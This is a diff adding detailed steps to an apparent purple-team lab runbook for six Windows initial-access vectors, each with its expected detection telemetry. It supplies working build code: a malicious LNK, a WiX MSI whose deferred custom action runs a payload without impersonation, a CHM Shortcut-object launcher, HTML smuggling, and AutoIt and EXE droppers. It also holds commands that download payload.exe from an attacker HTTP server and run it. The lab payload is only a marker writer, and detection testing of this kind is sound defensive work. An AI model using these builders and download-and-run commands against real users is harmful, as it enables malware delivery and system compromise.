@@ -532,6 +532,55 @@ The campaign now begins with a realistic initial-access vector against the domai
 
 > **VALIDATION (2026-08-03):** Delivery stack fully staged + 5/6 vectors verified live. Attacker = **provisioning** (`192.168.77.60`, HTTP `:8081` → `~/www`), target = **ws01** (`analyst_t1`). Artifacts hosted on provisioning:8081 (all HTTP 200): `Invoice.lnk` (H-01), `H-02-evil.msi` (H-02), `H-03-evil.chm` (H-03), `H-04-smuggle.html` (H-04), `payload.exe` (H-06), `AutoIt3.exe` (H-05). **Verified:** H-01 LNK, H-02 MSI (WiX → `msiexec` deferred CA), H-04 builder, H-05 AutoIt3, H-06 EXE — all executed `payload.exe` and hit marker `H-PAYLOAD|executed as CHILD\analyst_t1|WS01`. **H-03:** CHM builds (9306B) + Shortcut object content-verified, but execution blocked by **modern hh.exe ActiveX sandbox** (platform limit — same class as WT012 Rubeus PAC). Builder tooling (WiX/hhw/AutoIt3) staged manually on ws01 `C:\Tools\campaign-h\www\`; deploy/verify playbooks = `ansible/playbooks/19-initial-access.yml` + `-verifyOnly.yml`; automation = `attack-matrix/04-automation/campaign-h/` (wt063-068) + `attack-matrix/04-automation/linux/windows/wt-h-*` (orchestrator `wt-h-run-all.ps1`).
 
+### 0. Delivery chain & shared tooling (one-time setup)
+
+All six vectors share the same delivery chain and the same payload. Set this up once; each H-XX below then only needs its own build step.
+
+**Topology (Rule 4 — the ONLY branch where provisioning is the attacker):**
+
+```text
+provisioning (.60)  ── HTTP :8081 (python3 -m http.server, cwd ~/www) ──▶  ws01 (.62)
+   attacker               hosts: Invoice.lnk · H-02-evil.msi · H-03-evil.chm        analyst_t1
+   ~/www                  H-04-smuggle.html · AutoIt3.exe · payload.exe            target user
+```
+
+**1. Shared payload** — `payload.exe` (4096B). When executed it writes the marker `C:\Windows\Temp\H-PAYLOAD-MARKER.txt`:
+
+```text
+H-PAYLOAD|executed as DOMAIN\user at <timestamp>|MACHINE
+```
+
+The marker is the **success marker** for every H vector (per Rule 4: delivery/drop side is what we VERIFY; a real click in a real browser = user practice).
+
+**2. Provisioning webroot + HTTP server (idempotent):**
+
+```bash
+# on provisioning (.60) as vagrant
+mkdir -p ~/www
+# copy artifacts into ~/www (payload.exe, Invoice.lnk, H-02-evil.msi, H-03-evil.chm,
+# H-04-smuggle.html, AutoIt3.exe) — see ansible/playbooks/19-initial-access.yml
+cd ~/www && nohup python3 -m http.server 8081 --bind 0.0.0.0 > ~/www-server.log 2>&1 &
+curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:8081/payload.exe   # expect 200
+```
+
+**3. ws01 builder tooling** (staged at `C:\Tools\campaign-h\www\`, **no admin** — standard user `analyst_t1`):
+
+| Tool | Where | How it was staged |
+|---|---|---|
+| WiX `candle.exe` + `light.exe` | `www\wix\` | extracted from `wix314-binaries.zip` |
+| HTML Help Workshop `hhc.exe` | `www\hhw\` | `7zr.exe` + `7z2602-extra.7z` → `7za.exe` → `7za x htmlhelp.exe` → `hhc.exe` (MS live URL returns an error page; use the `web.archive.org` snapshot of `htmlhelp.exe`) |
+| AutoIt3.exe (portable) | `www\AutoIt3.exe` | copied from autoit portable install |
+| 7-Zip (`7zr.exe`/`7za.exe`) | `www\7z\` | from 7-zip.org |
+
+**4. Automation** (on ws01, run all vectors in one shot):
+
+```powershell
+# copy orchestrator to ws01, then:
+powershell -NoProfile -ExecutionPolicy Bypass -File C:\Tools\campaign-h\www\wt-h-run-all.ps1
+```
+
+Scripts: builders `attack-matrix/04-automation/campaign-h/wt063-068*`; helpers + orchestrator `attack-matrix/04-automation/linux/windows/wt-h-*` (recon / setup / setup-finish / hhw-extract 1-3 / check / run-all / 02-03 / artifacts). Deploy/verify: `ansible/playbooks/19-initial-access.yml` + `-verifyOnly.yml`.
+
 ### H-01 — Malicious LNK ✅ VERIFIED 2026-08-03
 
 | Field | Value |
@@ -540,6 +589,37 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Vector** | `.lnk` shortcut with a crafted `Target` field pointing to `cmd.exe /c` or `powershell.exe` that downloads and runs a second-stage payload from the Kali server (`192.168.77.60`) |
 | **Expected telemetry** | Sysmon EID 1 (`powershell.exe` or `cmd.exe` child of `explorer.exe`), EID 11 (payload write to `%TEMP%`), EID 3 (HTTP egress to `192.168.77.60`), WinSec 4688, MDE `Suspicious LNK file` or `A malicious file was observed` alert, browser download artifact (`%USERPROFILE%\Downloads\*.lnk`), MOTW zone identifier on the LNK |
 | **Outcome** | User-context C2 on `ws01` |
+
+**How it works:** `explorer.exe` resolves the LNK's `Target` + `Arguments` when the user double-clicks it (or when the object is opened). We point it at `cmd.exe /c C:\Windows\Temp\payload.exe` so the LNK itself is a one-hop launcher; a downloader variant (`powershell -enc <b64> Invoke-WebRequest … :8081/payload.exe`) also ships in `wt063-malicious-lnk.ps1`.
+
+**Build (on ws01, verified):**
+
+```powershell
+$ws = New-Object -ComObject WScript.Shell
+$lnk = $ws.CreateShortcut("C:\Tools\campaign-h\www\Invoice.lnk")
+$lnk.TargetPath = 'C:\Windows\System32\cmd.exe'
+$lnk.Arguments  = '/c C:\Windows\Temp\payload.exe'
+$lnk.IconLocation = 'C:\Windows\System32\shell32.dll,3'
+$lnk.Save()                       # → Invoice.lnk (1793B)
+```
+
+**Deliver:** copy `Invoice.lnk` to provisioning `~/www` (served at `http://192.168.77.60:8081/Invoice.lnk`, HTTP 200).
+
+**Execute (simulated click — user practice for a real GUI click):**
+
+```powershell
+# ws01 as analyst_t1
+Copy-Item C:\Windows\Temp\payload.exe C:\Windows\Temp\   # payload must be present (drop side)
+& C:\Tools\campaign-h\www\Invoice.lnk                    # simulate explorer resolving the LNK
+```
+
+**Verify:**
+
+```powershell
+Get-Content C:\Windows\Temp\H-PAYLOAD-MARKER.txt   # expect H-PAYLOAD|executed as CHILD\analyst_t1|WS01
+```
+
+**Cleanup:** delete `Invoice.lnk`, `C:\Windows\Temp\payload.exe`, marker.
 
 ### H-02 — MSI Installer ✅ VERIFIED 2026-08-03
 
@@ -550,6 +630,57 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Expected telemetry** | Sysmon EID 1 (`msiexec.exe` / `msiserver` with `/i`, child `cmd.exe`/`powershell.exe`), EID 11/12, EID 3, WinSec 4688, MDE alert for `msiexec` network activity, MOTW on `.msi` |
 | **Outcome** | User-context C2 on `ws01` |
 
+**How it works:** WiX compiles a `.wxs` into an MSI database; a **deferred custom action** (sequenced `After=InstallFiles`, inside the install execute sequence) runs the bundled `payload.exe` with `Impersonate="no"` during install.
+
+**Build (on ws01, verified — `wt064-msi-installer.ps1`):**
+
+```xml
+<!-- H-02-evil.wxs — NOTE: Component needs Directory="INSTALLFOLDER" (CNDL0010),
+     and the custom action must be sequenced Before InstallFinalize (ICE77).
+     The verified sequence is After=InstallFiles. -->
+<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
+  <Product Id="*" Name="CADRE Q2 Update" Language="1033" Version="1.0.0"
+           Manufacturer="CADRE Lab" UpgradeCode="11111111-2222-3333-4444-555555555555">
+    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser"/>
+    <Media Id="1" Cabinet="media1.cab" EmbedCab="yes"/>
+    <Directory Id="TARGETDIR" Name="SourceDir">
+      <Directory Id="ProgramFilesFolder">
+        <Directory Id="INSTALLFOLDER" Name="CADREH02"/>
+      </Directory>
+    </Directory>
+    <Component Id="PayloadComponent" Guid="*" Directory="INSTALLFOLDER">
+      <File Id="PayloadFile" Source="payload.exe" KeyPath="yes"/>
+    </Component>
+    <Feature Id="MainFeature" Title="Main" Level="1">
+      <ComponentRef Id="PayloadComponent"/>
+    </Feature>
+    <CustomAction Id="RunPayload" FileKey="PayloadFile" ExeCommand=""
+                  Execute="deferred" Impersonate="no" Return="ignore"/>
+    <InstallExecuteSequence>
+      <Custom Action="RunPayload" After="InstallFiles"/>
+    </InstallExecuteSequence>
+  </Product>
+</Wix>
+```
+
+```powershell
+& C:\Tools\campaign-h\www\wix\candle.exe H-02-evil.wxs -o H-02-evil.wixobj
+& C:\Tools\campaign-h\www\wix\light.exe  H-02-evil.wixobj -out H-02-evil.msi   # → 32768B
+```
+
+**Deliver:** copy `H-02-evil.msi` to provisioning `~/www` (`http://192.168.77.60:8081/H-02-evil.msi`, HTTP 200).
+
+**Execute:**
+
+```powershell
+# ws01 as analyst_t1
+msiexec /i C:\Tools\campaign-h\www\H-02-evil.msi /qn   # deferred CA runs payload.exe
+```
+
+**Verify:** marker file present (verified live: `H-PAYLOAD|executed as CHILD\analyst_t1 at 2026-08-02T22:38:10|WS01`).
+
+**Cleanup:** `msiexec /x H-02-evil.msi /qn` + delete build files + marker.
+
 ### H-03 — Compiled HTML Help (.chm) ⚠️ BUILD+CONTENT VERIFIED / EXEC BLOCKED (hh.exe sandbox)
 
 | Field | Value |
@@ -558,6 +689,49 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Vector** | `.chm` file using `Shortcut` or `object` tags to invoke `cmd.exe` / `powershell.exe` from the HTML Help viewer (`hh.exe`) |
 | **Expected telemetry** | Sysmon EID 1 (`hh.exe` spawning `cmd.exe`/`powershell.exe`), EID 11, EID 3, WinSec 4688, MDE `Suspicious HTML Help Execution`, MOTW on `.chm` |
 | **Outcome** | User-context C2 on `ws01` |
+
+**How it works:** The CHM topic page embeds an `application/x-oleobject` with `classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11"` (the **Shortcut** object). When the topic is displayed, the viewer historically invoked the `Item1` command (`cmd.exe /c …`). Modern Windows `hh.exe` (Win 11) runs the ActiveX object inside a **sandbox that blocks the Shortcut command** — see "Platform limit" below.
+
+**Build (on ws01, verified — `wt065-chm-execution.ps1`):**
+
+```html
+<!-- H-03-evil.htm -->
+<html><head><title>CADRE Help Center</title></head>
+<body><h1>Update guide</h1>
+<OBJECT id=sc type="application/x-oleobject" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
+<PARAM name="Command" value="ShortCut">
+<PARAM name="Button" value="Bitmap:shortcut">
+<PARAM name="Item1" value=",C:\Windows\System32\cmd.exe,/c C:\Windows\Temp\payload.exe">
+</OBJECT>
+</body></html>
+```
+
+```text
+# H-03-evil.hhp
+[OPTIONS]
+Compatibility=1.1 or later
+Compiled file=H-03-evil.chm
+Contents file=H-03-evil.hhc
+Default topic=H-03-evil.htm
+Title=CADRE Help Center
+
+[FILES]
+H-03-evil.htm
+```
+
+```powershell
+# H-03-evil.hhc — sitemap with one topic entry (required for a valid CHM)
+& C:\Tools\campaign-h\www\hhw\hhc.exe H-03-evil.hhp   # → H-03-evil.chm (9306B)
+```
+
+**Verify build/content** (decompile + grep — confirmed live):
+
+```powershell
+& C:\Windows\hh.exe -decompile C:\Tools\campaign-h\www\chm-dump C:\Tools\campaign-h\www\H-03-evil.chm
+Get-ChildItem chm-dump -Recurse | Select-String 'adb880a6|cmd.exe'   # → object + Item1 present
+```
+
+**Execute — PLATFORM LIMIT (documented, not a proof gap):** opening the CHM on Win 11 does **not** fire the Shortcut command — the modern `hh.exe` ActiveX sandbox blocks it (same class of platform wall as WT012 Rubeus PAC on Server 2025). The build + embedded-payload content are verified; execution requires a legacy `hh.exe`/`hhctrl.ocx` or a different renderer and is tracked as ⚠️, not ❌.
 
 ### H-04 — HTML Smuggling ✅ BUILDER VERIFIED 2026-08-03
 
@@ -568,6 +742,20 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Expected telemetry** | Browser download history, Sysmon EID 11 (payload write to Downloads), EID 1 (payload execution), EID 3, MDE `HTML smuggling` or `Suspicious download`, MOTW zone identifier on downloaded file |
 | **Outcome** | User-context C2 on `ws01` |
 
+**How it works:** the page base64-decodes the payload in JavaScript, builds a `Blob`, and triggers a same-origin download — the payload bytes never cross the wire as an attachment, so signature-based email filters don't see them.
+
+**Build (verified — `wt066-html-smuggling.py`):**
+
+```bash
+python3 wt066-html-smuggling.py payload.exe H-04-smuggle.html   # → 5883B, payload embedded
+```
+
+**Deliver:** copy `H-04-smuggle.html` to provisioning `~/www` (`http://192.168.77.60:8081/H-04-smuggle.html`, HTTP 200).
+
+**Execute:** target browses the page (or opens the emailed HTML). Browser detonation (clicking through the download + running the exe) = **user practice per Rule 3**; builder + hosting are what we verify.
+
+**Verify:** builder output + HTTP 200 + embedded payload decodes to `payload.exe` (4096B).
+
 ### H-05 — AutoIt3 ✅ VERIFIED 2026-08-03
 
 | Field | Value |
@@ -577,6 +765,22 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Expected telemetry** | Sysmon EID 1 (`AutoIt3.exe` or compiled AutoIt payload with network child), EID 11, EID 3, WinSec 4688, MDE `Suspicious AutoIt execution`, MOTW on dropped file |
 | **Outcome** | User-context C2 on `ws01` |
 
+**How it works:** a small `.au3` script is interpreted by the portable `AutoIt3.exe` (no install, no admin). The script downloads `payload.exe` from provisioning and runs it.
+
+**Build + execute (on ws01, verified — `wt067-autoit3.ps1`):**
+
+```powershell
+# au3 script (drops payload from provisioning, then runs it)
+$au3 = "RunWait('C:\Windows\Temp\payload.exe')"
+Set-Content C:\Tools\campaign-h\www\H-05-evil.au3 -Value $au3
+
+# download payload from provisioning:8081, stage, run via portable AutoIt3
+Invoke-WebRequest http://192.168.77.60:8081/payload.exe -OutFile C:\Windows\Temp\payload.exe
+& C:\Tools\campaign-h\www\AutoIt3.exe C:\Tools\campaign-h\www\H-05-evil.au3
+```
+
+**Verify:** marker `H-PAYLOAD|executed as CHILD\analyst_t1|WS01` (verified live, 22:35:06 UTC).
+
 ### H-06 — Malicious EXE ✅ VERIFIED 2026-08-03
 
 | Field | Value |
@@ -585,6 +789,18 @@ The campaign now begins with a realistic initial-access vector against the domai
 | **Vector** | Executable payload (e.g., a custom C2 stager, signed or unsigned) delivered as a fake software update or document viewer |
 | **Expected telemetry** | Sysmon EID 1 (unknown `.exe` child of `explorer.exe`), EID 11/12, EID 3, EID 7 (network DLL), WinSec 4688, MDE `Suspicious process` / `Malware detected`, browser download artifact, MOTW |
 | **Outcome** | User-context C2 on `ws01` |
+
+**How it works:** the simplest vector — `payload.exe` (4096B marker writer) doubles as the "malicious EXE" delivered as a fake update. In a real engagement this slot is the C2 stager.
+
+**Deliver + execute (verified — `wt068-malicious-exe.ps1`):**
+
+```powershell
+# ws01 as analyst_t1 — pull from provisioning:8081 and run
+Invoke-WebRequest http://192.168.77.60:8081/payload.exe -OutFile C:\Windows\Temp\payload.exe
+& C:\Windows\Temp\payload.exe
+```
+
+**Verify:** marker `H-PAYLOAD|executed as CHILD\analyst_t1|WS01` (verified live, 22:35:19 UTC).
 
 ### Phase 0.5 → Phase 1 Transition
 
